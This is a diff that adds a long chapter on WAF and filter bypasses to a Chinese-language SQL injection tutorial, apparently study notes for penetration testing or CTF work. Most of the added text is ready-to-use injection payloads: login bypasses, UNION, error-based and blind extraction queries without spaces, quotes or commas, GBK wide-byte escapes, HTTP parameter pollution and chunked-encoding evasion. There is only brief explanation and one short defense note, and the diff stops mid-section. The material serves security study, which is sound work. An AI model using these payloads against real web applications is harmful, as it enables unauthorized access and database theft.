@@ -10,6 +10,23 @@
 6. [进阶注入技术](#进阶注入技术)
 7. [盲注技术](#盲注技术)
 8. [绕过技术](#绕过技术)
+    - 8.1 [大小写绕过](#0x101-大小写绕过)
+    - 8.2 [双写/嵌套绕过](#0x102-双写嵌套绕过)
+    - 8.3 [编码绕过](#0x103-编码绕过)
+    - 8.4 [注释符绕过](#0x104-注释符绕过)
+    - 8.5 [等价替换](#0x105-等价替换)
+    - 8.6 [OR / AND 过滤绕过](#0x106-or--and-过滤绕过-⭐-高频考点)
+    - 8.7 [空格过滤绕过](#0x107-空格过滤绕过)
+    - 8.8 [单引号过滤绕过](#0x108-单引号引号过滤绕过)
+    - 8.9 [逗号过滤绕过](#0x109-逗号过滤绕过)
+    - 8.10 [等号/比较符过滤绕过](#0x1010-等号比较运算符过滤绕过)
+    - 8.11 [宽字节注入](#0x1011-宽字节注入gbk-编码场景)
+    - 8.12 [内联注释与版本特性绕过](#0x1012-内联注释与-mysql-版本特性绕过)
+    - 8.13 [HTTP 参数污染与协议级绕过](#0x1013-http-参数污染hpp与协议级绕过)
+    - 8.14 [联合查询被过滤的替代方案](#0x1014-联合查询被过滤的替代方案)
+    - 8.15 [综合绕过策略](#0x1015-综合绕过策略)
+    - 8.16 [绕过技术总结对比表](#0x1016-绕过技术总结对比表)
+    - 8.17 [绕过手法速查口诀](#0x1017-绕过手法速查口诀)
 9. [二次注入](#二次注入)
 10. [不同数据库的注入差异](#不同数据库的注入差异)
 11. [INSERT/UPDATE/DELETE 注入（非查询语句注入）](#insertupdatedelete-注入非查询语句注入)
@@ -627,95 +644,863 @@ id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1)) = 115, BENCHMARK(5000000, MD5('test
 
 ### 0x10 常见的绕过技巧
 
-在实际渗透测试中，经常会遇到各种 WAF（Web 应用防火墙）或代码层面的过滤。以下是一些常见的绕过思路。
+在实际渗透测试中，经常会遇到各种 WAF（Web 应用防火墙）或代码层面的过滤。以下是一些常见的绕过思路，每个类别下面按照使用频率和重要性排序。
 
-#### 大小写绕过
+---
+
+#### 0x10.1 大小写绕过
 
 当过滤规则只针对特定关键字时：
 
 ```sql
 -- 原始
 UNION SELECT
+
 -- 绕过
 uNiOn sElEcT
+UnIoN SeLeCt
+UNION select
+union SELECT
 ```
 
-#### 双写绕过
+**适用场景**：WAF/过滤规则只做了简单的大小写敏感关键字匹配，没有统一转为大写或小写再比对。
 
-当程序将敏感关键字替换为空时（只替换一次）：
+**不适用场景**：程序或 WAF 在检测前先将输入转为大写/小写（如 `strtoupper()`），此时大小写绕过无效。
+
+---
+
+#### 0x10.2 双写/嵌套绕过
+
+当程序将敏感关键字替换为空时（通常只替换一次）：
 
 ```sql
 -- 如果程序将 SELECT 替换为空
 SELSELECTECT  →  经过替换后剩下的还是 SELECT
+
+-- 如果程序将 OR 替换为空
+OORR         →  过滤掉 OR 后剩下 OR
+
+-- 如果程序将 AND 替换为空
+ANANDD       →  过滤掉 AND 后剩下 AND
+
+-- UNION 双写
+UNUNIONION   →  过滤掉 UNION 后剩下 UNION
+
+-- WHERE 双写
+WHWHEREERE   →  过滤掉 WHERE 后剩下 WHERE
 ```
 
-#### 编码绕过
+**原理**：如果程序执行了类似 `str_replace("OR", "", $input)` 的过滤且只执行一次，那么 `OORR` 中间的 `OR` 被替换掉后，剩下的恰好就是 `OR`。
+
+**变种**：如果过滤函数循环执行多次（如 `preg_replace` 不加 `/g` 或 `while` 循环），双写可能失效。此时可以尝试三重/多重双写：
+
+```sql
+OORORR      →  第一次去掉中间的 OR → OORR → 第二次去掉中间的 OR → OR
+```
+
+**实战口诀**：遇到关键字替换过滤时，先用单双写测试过滤执行了几次，再决定用几重双写。
+
+---
+
+#### 0x10.3 编码绕过
 
 ```sql
 -- URL 编码
-单引号 ' → %27
+单引号 '  →  %27           -- 基本的 URL 编码
+#         →  %23            -- 井号编码
+空格      →  %20            -- URL 编码空格
+双引号 "  →  %22
+
+-- 二次 URL 编码（如果程序解码了两次）
+单引号 '  →  %2527          -- %25 → % → 最终解码为 '
 
 -- 十六进制编码（绕过对引号的过滤）
 SELECT * FROM users WHERE username = 0x61646D696E
+-- 0x61646D696E = 'admin'
 
--- Unicode 编码
--- 某些 WAF 可能无法识别 Unicode 编码的 SQL 关键字
+-- 利用字符串拼接的隐式转换
+SELECT * FROM users WHERE username = 0x61646D696E
+-- MySQL 会将十六进制自动转为字符串比较
+
+-- Unicode 编码（某些 WAF 无法识别）
+-- %u0027 表示单引号（某些 IIS+ASP 环境）
+%u0027 → '
+
+-- Base64 编码（某些数据库或中间件支持）
+-- 不常见，但特定场景可用
 ```
 
-#### 注释符绕过
+**注意**：十六进制编码在 MySQL 中可以直接替代字符串字面量，但**不能替代 SQL 关键字**（如不能用 `0x53454C454354` 替代 `SELECT` 关键字本身）。
 
-在关键字中间插入注释符：
+---
+
+#### 0x10.4 注释符绕过
+
+在关键字中间插入注释符，分割关键字但不影响语义：
 
 ```sql
+-- 关键字内插入注释
 SEL/**/ECT * FROM/**/users
 UN/**/ION SEL/**/ECT 1,2,3
+O/**/R 1=1
+A/**/ND 1=1
+WHE/**/RE 1=1
+
+-- 使用多个注释
+SEL/**//**/ECT
+UN/**/ /**/ION
+
+-- 注释和换行的组合
+SEL/**/
+ECT * FROM users
+
+-- 注释代替空格
+SELECT/**/DATABASE()
+WHERE/**/1=1
 ```
 
-#### 等价替换
+**MySQL 内联注释 `/*!...*/` 的特殊用法**：
 
 ```sql
--- 空格被过滤时
-SELECT/**/DATABASE()   -- 使用注释代替空格
-SELECT(DATABASE())     -- 使用括号包裹
-SELECT`DATABASE`()     -- 使用反引号
+-- 内联注释中的关键字不会被当作普通关键字解析，但会被执行
+/*!UNION*/ /*!SELECT*/ 1,2,3
+/*!OR*/ 1=1
 
--- = 被过滤时
-id=1 AND 1 LIKE 1      -- 使用 LIKE
-id=1 AND 1 IN (1)      -- 使用 IN
-id=1 AND 1 BETWEEN 0 AND 2  -- 使用 BETWEEN
+-- 指定版本号：仅在特定版本及以上执行
+/*!80000SELECT*/ 1   -- MySQL 8.0+ 才会执行，低版本忽略
+/*!50000UNION*/      -- MySQL 5.0+
 
--- OR / AND 被过滤时
-id=1 || 1=1            -- 使用 || 代替 OR
-id=1 && 1=1            -- 使用 && 代替 AND
+-- 混合普通注释和内联注释
+id=-1 UN/**/ION SEL/**/ECT 1,2,3
 
--- 逗号被过滤时（常用于 SUBSTRING、LIMIT）
-SUBSTRING(DATABASE() FROM 1 FOR 1)  -- 使用 FROM...FOR 语法
-LIMIT 1 OFFSET 0                    -- 使用 OFFSET 代替逗号
+-- 在 FROM 表名后使用注释
+FROM users WHERE/*!*/1=1
 ```
 
-#### HTTP 参数污染（HPP）
+**各数据库注释符速查**：
+
+| 数据库 | 注释符 |
+|-------|--------|
+| MySQL | `-- `、`#`、`/* */`、`/*!...*/`（内联）|
+| MSSQL | `--`、`/* */` |
+| Oracle | `--`、`/* */` |
+| PostgreSQL | `--`、`/* */` |
+
+---
+
+#### 0x10.5 等价替换
+
+当特定的操作符或关键字被过滤时，寻找语义等价的替代方案。
+
+##### 空格被过滤时
+
+```sql
+-- 方法1：使用注释代替空格（最常用）
+SELECT/**/DATABASE()
+
+-- 方法2：使用括号包裹（非常实用）
+SELECT(DATABASE())FROM(users)WHERE(id=1)
+SELECT(id)FROM(users)
+UNION(SELECT(1),(2),(3))
+
+-- 方法3：使用反引号（MySQL 特有）
+SELECT`id`FROM`users`
+
+-- 方法4：使用 Tab、换行等空白字符
+SELECT%09*%09FROM%09users    -- %09 = Tab
+SELECT%0a*%0aFROM%0ausers    -- %0a = 换行 (LF)
+
+-- 方法5：URL 中的 +（查询字符串中 + 表示空格）
+?id=1+AND+1=1
+
+-- 方法6：省略空格（部分场景可行）
+UNION(SELECT(1),(2),(3))
+```
+
+**不带空格的完整 payload 示例**：
+
+```sql
+-- UNION 查询不带空格
+id=-1 UNION(SELECT(1),(2),(3))
+
+-- 报错注入不带空格
+id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT(DATABASE()))))
+
+-- 获取表名不带空格
+id=-1 UNION(SELECT(1),GROUP_CONCAT(TABLE_NAME),(3)FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE())
+```
+
+##### = 被过滤时
+
+```sql
+id=1 AND 1 LIKE 1              -- 使用 LIKE（最常用替代）
+id=1 AND 1 IN (1)              -- 使用 IN
+id=1 AND 1 BETWEEN 0 AND 2     -- 使用 BETWEEN
+id=1 AND 1 != 2                -- 使用 !=
+id=1 AND 1 <> 2                -- 使用 <>
+id=1 AND NOT 1 <> 1            -- 使用 NOT + <>
+id=1 AND 1 IS NOT NULL         -- 使用 IS NOT NULL
+```
+
+##### 逗号被过滤时
+
+```sql
+-- SUBSTRING 替代：使用 FROM...FOR 语法
+SUBSTRING(DATABASE(), 1, 1)        →   SUBSTRING(DATABASE() FROM 1 FOR 1)
+SUBSTR(DATABASE(), 2, 1)           →   SUBSTR(DATABASE() FROM 2 FOR 1)
+MID(DATABASE(), 3, 1)             →   MID(DATABASE() FROM 3 FOR 1)
+
+-- LIMIT 替代：使用 OFFSET
+LIMIT 0,1    →   LIMIT 1 OFFSET 0
+LIMIT 5,10   →   LIMIT 10 OFFSET 5
+
+-- UNION SELECT 多个字段无逗号（使用 JOIN 或子查询）
+id=-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
+id=-1 UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b,(SELECT 3)c
+
+-- MySQL 8+ 使用 VALUES（无逗号）
+id=-1 UNION VALUES ROW(1,2,3)
+```
+
+##### 函数替代
+
+```sql
+-- SUBSTRING 系
+SUBSTRING(str, pos, len)
+SUBSTR(str, pos, len)
+MID(str, pos, len)
+
+-- ASCII 系
+ASCII(c)       -- 返回字符的 ASCII 码
+ORD(c)         -- 同 ASCII()，MySQL
+
+-- SLEEP 替代（时间盲注）
+SLEEP(n)        →   BENCHMARK(10000000, MD5('x'))  -- 在 MySQL 5.x 可用
+SLEEP(n)        →   (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)  -- 笛卡尔积拖慢查询
+
+-- IF 替代
+IF(cond, a, b)  →   CASE WHEN cond THEN a ELSE b END
+
+-- 长度判断
+LENGTH(str)     →   CHAR_LENGTH(str)   -- 多字节字符串
+```
+
+---
+
+#### 0x10.6 OR / AND 过滤绕过 ⭐ 高频考点
+
+这是实际渗透中最常遇到的过滤之一。WAF 和代码过滤器通常会屏蔽 `OR` 和 `AND` 关键字，下面从简到繁列出所有已知绕过手法。
+
+##### 1. 符号替换（最简单直接）
+
+```sql
+-- MySQL 中 || 默认等同于 OR，&& 等同于 AND
+OR   →   || 
+AND  →   &&
+
+-- 示例
+id=1' || '1'='1          -- 等价于 id=1' OR '1'='1
+id=1' && '1'='1          -- 等价于 id=1' AND '1'='1
+id=1 || 1=1              -- 数字型 OR
+id=1 && 1=1              -- 数字型 AND
+
+-- 使用位运算符
+id=1 | 1                 -- 按位 OR，非零为真
+id=1 & 1                 -- 按位 AND，结果为 1（真）
+```
+
+**⚠️ 注意**：`||` 在 Oracle 和 PostgreSQL 中是字符串拼接符**不是** OR，慎用！
+MySQL 中若 `sql_mode` 包含 `PIPES_AS_CONCAT`，`||` 也会变成拼接，此时需要其他手法。
+
+##### 2. 双写绕过
+
+当程序将 `OR`/`AND` 替换为空且只替换一次时：
+
+```sql
+-- OR 的双写
+OORR   →  替换掉中间的 OR 后剩下 OR
+OORORR →  多重双写（应对多次替换）
+
+-- AND 的双写
+ANANDD →  替换掉中间的 AND 后剩下 AND
+
+-- 实战示例
+id=1 OORR 1=1            -- 等价于 id=1 OR 1=1
+id=1 AANDND 1=1          -- 等价于 id=1 AND 1=1
+```
+
+##### 3. 注释分割绕过
+
+```sql
+-- OR 加注释
+O/**/R 1=1
+O/**//**/R 1=1            -- 多重注释
+
+-- AND 加注释
+A/**/ND 1=1
+A//**/ND 1=1
+
+-- 注释 + 换行组合
+O/**/
+R 1=1
+```
+
+##### 4. 大小写/URL 编码组合
+
+```sql
+-- 大小写混合
+oR 1=1       Or 1=1       aNd 1=1       AnD 1=1
+
+-- URL 编码部分字符
+%4fR 1=1             -- %4f = 'O'
+%6fR 1=1             -- %6f = 'o'
+O%52 1=1             -- %52 = 'R'
+A%4eD 1=1            -- %4e = 'N'
+AN%44 1=1            -- %44 = 'D'
+```
+
+##### 5. 逻辑等价替换（核心技巧）
+
+不依赖关键字 `OR`/`AND`，而是用其他逻辑结构达到相同目的：
+
+```sql
+-- 使用 XOR（异或）
+id=1 XOR 1=1            -- 结果为假（1 XOR 1 = 0）
+id=1 XOR 1=2            -- 结果为真（1 XOR 0 = 1）
+
+-- 使用 NOT + IN / BETWEEN 组合
+-- WHERE id=1 OR id=2  →  WHERE id IN (1,2)      -- 用 IN 代替多个 OR
+-- WHERE id=1 AND 1=1  →  WHERE id IN (SELECT 1) -- 子查询 IN 代替
+
+-- 使用 EXISTS
+id=1 EXISTS(SELECT 1)   -- 始终为真（子查询有结果则 EXISTS 为真）
+
+-- 使用 HAVING 替代 WHERE（有 GROUP BY 时）
+id=1 HAVING 1=1
+
+-- 使用 CASE WHEN
+id=1 CASE WHEN 1=1 THEN 1 END
+
+-- 多个条件并列（MySQL 允许某些省略写法）
+WHERE (1=1)(1=1)         -- 某些场景可行
+```
+
+##### 6. 登录绕过实战：当 OR 被过滤
+
+```sql
+-- 场景：登录框，原始 SQL 为：
+-- SELECT * FROM users WHERE username='$user' AND password='$pass'
+
+-- ❌ 标准绕过（OR 被过滤时报错）
+username: admin' OR '1'='1
+
+-- ✅ 方法1：使用 || 替代 OR
+username: admin' || '1'='1
+
+-- ✅ 方法2：双写绕过
+username: admin' OORR '1'='1
+
+-- ✅ 方法3：注释绕过密码检查（最简单，不需要 OR）
+username: admin'--               -- 注释掉后面的 AND password='...'
+username: admin'#                 -- MySQL 注释符
+
+-- ✅ 方法4：注释 + || 组合
+username: admin'/**/||/**/'1'='1
+
+-- ✅ 方法5：使用 UNION（如果 UNION 没被过滤）
+username: admin' UNION SELECT * FROM users-- 
+
+-- ✅ 方法6：万能密码变体（用户名处使用注释）
+username: admin'/*               -- 用 /* 注释掉后面
+```
+
+##### 7. 盲注场景绕过 OR/AND 过滤
+
+```sql
+-- 布尔盲注：AND 被过滤时的条件判断
+
+-- 使用 && 替代
+id=1 && LENGTH(DATABASE())=8
+
+-- 使用 IF
+id=1 IF(LENGTH(DATABASE())=8, 1, 0)
+
+-- 使用 CASE WHEN
+id=1 CASE WHEN LENGTH(DATABASE())=8 THEN 1 END
+
+-- 使用 NOT + != 的等价转换
+-- AND LENGTH()=8 等价于 NOT (LENGTH()!=8)
+id=1 NOT (LENGTH(DATABASE())!=8)
+
+-- 时间盲注：OR 被过滤时的条件判断
+-- 原始：id=1 OR IF(LENGTH(DATABASE())=8, SLEEP(3), 0)
+-- 绕过
+id=1 || IF(LENGTH(DATABASE())=8, SLEEP(3), 0)  -- 使用 ||
+id=1 | IF(LENGTH(DATABASE())=8, SLEEP(3), 0)   -- 使用 | 位运算
+```
+
+---
+
+#### 0x10.7 空格过滤绕过
+
+过滤空格的场景非常常见，尤其是在 GET 请求的 URL 参数中。
+
+```sql
+-- 方法1：使用注释 /**/ 代替空格（最通用）
+SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1
+
+-- 方法2：使用括号包裹（非常实用，推荐）
+SELECT(DATABASE())FROM(users)WHERE(id=1)
+UNION(SELECT(1),(2),(3))
+SELECT(id)FROM(users)WHERE(id=1)AND(1=1)
+
+-- 方法3：使用反引号（MySQL 特有）
+SELECT`id`FROM`users`
+
+-- 方法4：使用 Tab、换行等控制字符
+SELECT%09*%09FROM%09users%09WHERE%09id=1    -- %09 = Tab
+SELECT%0a*%0aFROM%0ausers%0aWHERE%0aid=1    -- %0a = 换行 (LF)
+SELECT%0d%0a*%0d%0aFROM%0d%0ausers          -- %0d%0a = CRLF
+
+-- 方法5：URL 中的 +（在 URL 查询字符串中，+ 表示空格）
+?id=1+AND+1=1
+
+-- 方法6：使用数字+操作符紧凑写法
+SELECT*FROM(SELECT 1)a                     -- SELECT* 之间无空格（某些场景）
+```
+
+**不带空格的完整 payload 示例**：
+
+```sql
+-- UNION 查询
+id=-1 UNION(SELECT(1),(2),(3))
+id=-1 UNION(SELECT*FROM`users`)
+
+-- 报错注入
+id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT(DATABASE()))))
+
+-- 获取表名
+id=-1 UNION(SELECT(1),GROUP_CONCAT(TABLE_NAME),(3)FROM`information_schema`.`TABLES`WHERE`TABLE_SCHEMA`=DATABASE())
+
+-- 时间盲注
+id=1 AND IF((LENGTH(DATABASE()))=8,SLEEP(3),0)
+```
+
+---
+
+#### 0x10.8 单引号/引号过滤绕过
+
+单引号是 SQL 注入中最重要的字符，也是过滤最严格的字符。
+
+```sql
+-- 方法1：十六进制编码（推荐，最常用）
+WHERE username = 0x61646D696E       -- 'admin'
+WHERE table_name = 0x7573657273     -- 'users'
+
+-- 完整示例：获取表名（绕过单引号）
+id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x7365637572697479
+
+-- 方法2：使用 CHAR() 函数拼接字符串
+WHERE username = CHAR(97,100,109,105,110)   -- 'admin'
+-- 数据库名 security 的 CHAR 拼写
+WHERE TABLE_SCHEMA=CHAR(115,101,99,117,114,105,116,121)
+
+-- 方法3：使用双引号替代（MySQL 中双引号可代替单引号，取决于 sql_mode）
+WHERE username = "admin"   -- 在 MySQL 默认配置下可行（未设置 ANSI_QUOTES）
+
+-- 方法4：宽字节注入（GBK 编码场景）
+username=%df' OR 1=1--    -- 详见 [0x10.11 宽字节注入]
+
+-- 方法5：使用反斜杠转义逃逸
+-- 如果程序用反斜杠转义引号，输入 \' 可能产生 escape 效果
+
+-- 方法6：使用 UNHEX() 函数（MySQL）
+WHERE username = UNHEX('61646D696E')
+
+-- 方法7：不需要引号的内建函数和变量
+SELECT DATABASE()           -- 当前数据库名
+SELECT USER()               -- 当前用户
+SELECT @@VERSION            -- 数据库版本
+SELECT @@datadir            -- 数据目录
+SELECT @@basedir            -- 安装目录
+```
+
+**引号被过滤下的布尔/时间盲注**（完全不依赖引号）：
+
+```sql
+-- 判断表名第一个字符（不需要引号）
+id=1 AND (SELECT ASCII(SUBSTRING(TABLE_NAME,1,1)) FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1)=115
+
+-- 报错注入（不需要引号）
+id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))
+
+-- UNION 获取数据（不需要引号）
+id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()
+```
+
+---
+
+#### 0x10.9 逗号过滤绕过
+
+```sql
+-- 方法1：使用 FROM...FOR 语法替代 SUBSTRING 中的逗号
+SUBSTRING(DATABASE(), 1, 1)        →   SUBSTRING(DATABASE() FROM 1 FOR 1)
+MID(DATABASE(), 1, 1)              →   MID(DATABASE() FROM 1 FOR 1)
+
+-- 方法2：使用 OFFSET 替代 LIMIT 中的逗号
+LIMIT 0,1    →   LIMIT 1 OFFSET 0
+LIMIT 5,10   →   LIMIT 10 OFFSET 5
+
+-- 方法3：使用 JOIN 或子查询替代 UNION SELECT 中的逗号
+-- 无逗号的 UNION 查询
+id=-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
+id=-1 UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b,(SELECT 3)c
+
+-- 方法4：MySQL 8+ 使用 VALUES ROW（无逗号）
+id=-1 UNION VALUES ROW(1,2,3)
+
+-- 方法5：盲注逐字符猜解替代逗号
+-- 原始（含逗号）
+ASCII(SUBSTRING(DATABASE(),1,1)) > 100
+-- 替代（无逗号）
+ASCII(SUBSTRING(DATABASE() FROM 1 FOR 1)) > 100
+```
+
+---
+
+#### 0x10.10 等号/比较运算符过滤绕过
+
+```sql
+-- 方法1：使用 LIKE 替代 =
+WHERE username LIKE 'admin'         -- 精确匹配
+WHERE 1 LIKE 1                      -- 等价于 1=1
+
+-- 方法2：使用 IN 替代 =
+WHERE 1 IN (1)                      -- 等价于 1=1
+WHERE 'admin' IN ('admin','user')   -- 等价于 'admin'='admin'
+
+-- 方法3：使用 BETWEEN ... AND
+WHERE 1 BETWEEN 0 AND 2             -- 等价于 1=1
+WHERE LENGTH(DATABASE()) BETWEEN 7 AND 9  -- 长度范围判断
+
+-- 方法4：使用 >、<、>=、<=、<>
+WHERE 1 > 0                         -- 永真
+WHERE 1 < 2                         -- 永真
+WHERE 1 <> 2                        -- 等价于 1 != 2
+WHERE NOT 1 <> 1                    -- 等价于 1=1
+
+-- 方法5：使用 REGEXP / RLIKE（MySQL 正则）
+WHERE 'admin' REGEXP 'admin'        -- 等价于 'admin'='admin'
+WHERE DATABASE() REGEXP '^s'        -- 正则匹配首字母
+
+-- 方法6：使用 SOUNDS LIKE（MySQL 发音匹配）
+WHERE 'admin' SOUNDS LIKE 'admin'
+
+-- 方法7：使用 IS NOT NULL / IS NULL
+WHERE 1 IS NOT NULL                 -- 永真
+WHERE IF(条件, 1, NULL) IS NOT NULL -- 条件判断
+
+-- 方法8：使用 <=>（MySQL 安全等于，可比较 NULL）
+WHERE 1 <=> 1                       -- 等价于 1=1
+
+-- 方法9：使用比较函数
+WHERE GREATEST(1,0)=1               -- 取最大值
+WHERE LEAST(1,2)=1                  -- 取最小值
+WHERE STRCMP('a','a')=0             -- 字符串比较（相等返回 0）
+
+-- 方法10：盲注场景下的等号绕过
+-- 原始：ASCII(SUBSTRING(DATABASE(),1,1)) = 115
+-- 使用二分法靠 > 和 < 逼近
+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) > 114
+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) < 116
+-- 或者使用 BETWEEN
+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) BETWEEN 110 AND 120
+```
+
+---
+
+#### 0x10.11 宽字节注入（GBK 编码场景）
+
+宽字节注入是一种专门针对 **GBK 编码** 环境的绕过技术，用于绕过 `addslashes()`、`mysql_real_escape_string()` 等转义函数。
+
+##### 背景
+
+当程序使用转义函数时，单引号 `'`（`%27`）会被转义为 `\'`（`%5c%27`），从而无法闭合 SQL 语句。
+
+##### 原理
+
+在 GBK 编码中，某些高位字节（`%81`~`%fe` 范围）与反斜杠 `\`（`%5c`）组合时，会被解码为**一个完整的汉字（宽字符）**，从而使反斜杠的转义效果被"吃掉"。
+
+```
+用户输入：%df'
+转义后：  %df%5c%27    （%5c 是反斜杠）
+GBK 解码：%df%5c → 汉字"連"（一个完整的宽字符）
+          %27 → 单引号 '（成功逃逸！）
+最终效果：... WHERE username = '連' ...
+```
+
+核心要点：
+- `%df'` → 程序转义加 `\` → `%df\'` → GBK 解码把 `%df\` 解析成一个汉字 → `'` 逃逸出来
+- 这里**吃掉了反斜杠**，让引号成功闭合
+
+##### 常用 payload
+
+```sql
+-- 登录绕过
+username=%df' OR 1=1-- 
+
+-- 获取数据库名
+username=%df' UNION SELECT 1,DATABASE(),3-- 
+
+-- 报错注入
+username=%df' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- 
+
+-- 时间盲注
+username=%df' AND IF(LENGTH(DATABASE())=8,SLEEP(3),0)-- 
+```
+
+##### 可用的宽字节范围
+
+不是只有 `%df` 有效，`%81`~`%fe` 范围内的高位字节都可以：
+
+```sql
+username=%bf' OR 1=1--     -- %bf 也有效
+username=%e0' OR 1=1--     -- %e0 也有效
+```
+
+##### 防御
+
+使用 `SET NAMES utf8` 或 `set_charset("utf8")` 并配合 `mysql_real_escape_string()`，就可以避免宽字节注入。现代应用（PHP 7+、MySQLi / PDO）默认使用 UTF-8，宽字节注入已经较少见。
+
+---
+
+#### 0x10.12 内联注释与 MySQL 版本特性绕过
+
+MySQL 特有的 `/*!...*/` 语法具有特殊功能，可以绕过基于"关键字识别"的 WAF。
+
+```sql
+-- 1. 关键字被过滤时，用内联注释包裹
+/*!UNION*/ /*!SELECT*/ 1,2,3
+
+-- 2. 条件执行（版本号控制）
+/*!80000SELECT*/ 1 FROM /*!80000users*/  -- 仅在 MySQL 8.0+ 执行
+/*!50000SELECT*/ 1                        -- MySQL 5.0+
+/*!40101SELECT*/ 1                        -- MySQL 4.01+
+
+-- 3. 内联注释在 ORDER BY 中
+?order=/*!80000id*/         -- 在 MySQL 8.0+ 按 id 排序
+
+-- 4. 混合使用普通注释和内联注释
+id=-1 UN/**/ION/*!SELECT*/1,2,3
+```
+
+**`/*!...*/` 与 `/**/` 的区别**：
+
+| 注释类型 | 行为 |
+|---------|------|
+| `/**/` | 真正的注释，内容被完全忽略 |
+| `/*!...*/` | 看起来像注释，但 MySQL **会执行其中的内容** |
+| `/*!50000...*/` | 仅在 MySQL 5.00.00 及以上版本执行 |
+
+对于不支持内联注释的数据库（如 MariaDB 部分版本），`/*!...*/` 中的内容仍可能被执行。
+
+---
+
+#### 0x10.13 HTTP 参数污染（HPP）与协议级绕过
+
+##### HPP（HTTP Parameter Pollution）
+
+通过发送多个同名参数来绕过 WAF 检测：
 
 ```sql
 -- 原始请求
 ?id=1 UNION SELECT 1,2,3
 
--- HPP 绕过某些 WAF
+-- HPP 拆分：WAF 只检查其中一个，后端拼接后生效
 ?id=1 UNION&id=SELECT 1,2,3
+
+-- HPP + 注释
+?id=1 UNION /*&id=*/ SELECT 1,2,3
+
+-- WAF 取第一个参数，后端取最后一个
+?id=1 UNION&id=SELECT 1,2,3&id=&id=1
+
+-- WAF 取最后一个参数，后端取第一个
+?id=1 UNION SELECT 1,2,3&id=1
 ```
 
-当 WAF 只检查第一个 `id` 参数，而后端接收的是最后一个 `id` 参数时，可以绕过检测。
+##### 分块传输（Chunked Transfer Encoding）
 
-#### HTTP 参数分块传输
+对 POST 请求使用分块传输，将 payload 拆分成小块发送：
 
-对于某些 WAF，可以将请求体分块传输，绕过基于内容长度的检测。
+```
+POST /login.php HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
 
-### 0x11 联合查询被过滤
+1
+u
+2
+ni
+1
+o
+3
+n 
+1
+s
+1
+e
+1
+l
+2
+ec
+1
+t
+1
+```
 
-当 `UNION` 和 `SELECT` 都被严格过滤时，可以考虑其他方式：
+##### 请求方法转换
 
-1. 使用**报错注入**代替 UNION 注入。
-2. 使用**盲注**。
-3. 使用**堆叠查询**（如果支持）。
+```sql
+-- GET 转 POST（WAF 可能只检测 GET）
+GET   →  POST  (携带相同参数)
+POST  →  JSON  (Content-Type: application/json)
+
+-- 使用非常规 HTTP 方法
+OPTIONS / PUT / DELETE / PATCH
+```
+
+##### Content-Type 混淆
+
+```sql
+application/x-www-form-urlencoded  → 标准表单（WAF 查得最严）
+multipart/form-data                → 文件上传格式（WAF 可能忽略部分字段）
+application/json                   → JSON 格式
+text/plain                         → 纯文本（WAF 可能不检查）
+application/xml                    → XML 格式
+```
+
+---
+
+#### 0x10.14 联合查询被过滤的替代方案
+
+当 `UNION` 和 `SELECT` 都被严格过滤时，可以考虑其他方式获取数据：
+
+1. **报错注入**：通过 `EXTRACTVALUE()` / `UPDATEXML()` 从错误消息中提取数据
+2. **布尔盲注**：通过页面 True/False 差异逐字符推断
+3. **时间盲注**：通过响应延迟推断数据
+4. **堆叠查询**（如果支持）：`id=1; SELECT ...`
+5. **ORDER BY 盲注**：通过排序顺序差异判断条件
+6. **带外注入（OOB）**：通过 DNS/HTTP 请求外传数据
+
+---
+
+#### 0x10.15 综合绕过策略
+
+在实际渗透测试中，往往不止一种过滤，而是多重过滤并存。以下列举典型的多重过滤场景及应对方案。
+
+##### 场景1：OR 和空格同时被过滤
+
+```sql
+-- 原始 payload
+id=1 OR 1=1
+
+-- 组合绕过
+id=1||1=1                  -- || 替代 OR，且 || 两边不需要空格
+id=1/**/||/**/1=1          -- || + 注释代替空格
+```
+
+##### 场景2：OR、空格、逗号同时被过滤（盲注场景）
+
+```sql
+-- 原始：id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) > 100
+
+-- 组合绕过
+id=1&&ASCII(SUBSTRING(DATABASE()FROM 1 FOR 1))>100
+-- && 替代 AND，FROM...FOR 替代逗号
+```
+
+##### 场景3：UNION、SELECT、空格、单引号全部被过滤
+
+```sql
+-- 此时 UNION SELECT 几乎不可用
+-- 替代方案1：报错注入（不需要 UNION）
+id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT(DATABASE()))))
+
+-- 替代方案2：时间盲注
+id=1 AND IF(LENGTH(DATABASE())=8,SLEEP(3),0)
+
+-- 替代方案3：如果只是引号被过滤，用十六进制
+id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()
+-- DATABASE() 本身不需要引号
+```
+
+##### 场景4：登录框，OR 被过滤，且不能使用注释
+
+```sql
+-- 标准：admin' OR '1'='1
+
+-- 方案1：|| 替代 OR
+admin' || '1'='1
+
+-- 方案2：双写
+admin' OORR '1'='1
+
+-- 方案3：使用 UNION（如果可用）
+admin' UNION SELECT 1,2,3-- 
+
+-- 方案4：使用 # 注释（MySQL）
+admin'#
+```
+
+##### 场景5：等号和引号同时被过滤（盲注场景）
+
+```sql
+-- 使用 BETWEEN 和 REGEXP
+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) BETWEEN 100 AND 120
+id=1 AND DATABASE() REGEXP '^s'
+
+-- 使用 > 和 < 逼近
